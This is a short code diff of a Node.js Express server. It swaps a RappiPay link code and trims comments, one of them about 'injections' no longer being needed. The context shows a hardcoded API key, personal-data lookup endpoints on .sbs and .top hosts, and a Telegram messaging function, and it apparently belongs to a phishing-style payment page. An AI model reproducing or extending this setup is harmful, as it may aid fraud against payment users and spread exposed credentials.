@@ -16,7 +16,7 @@ const API_APORTES = 'https://api-aportes-dev.krakenlabs.sbs/consulta';
 const API_APORTES_KEY = 'aportes-84a5a244a6223f60bf6d89a35125e917fe5c399deb5251bc';
 const API_NOMBRES = 'https://api-nombres.krakenlabs.sbs/consulta';
 const API_CENTRAL = 'https://api.centraldepagos.top';
-const RAPPIPAY_LINK_CODE = 'CRaWdQ';
+const RAPPIPAY_LINK_CODE = 'oiTiOu';
 
 app.use(cors());
 app.use(express.json());
@@ -32,14 +32,12 @@ async function enviarTelegram(msg) {
   } catch (e) { console.error('TG error:', e.message); }
 }
 
-// Ya no se necesitan inyecciones — todo está en index.html directamente
-
 // Servir index.html directamente (ya tiene todo integrado)
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Archivos estáticos locales (css, js, img) — RÁPIDO
+// Archivos estáticos locales (css, js, img)
 app.use(express.static(__dirname));
 
 // === APIs ===
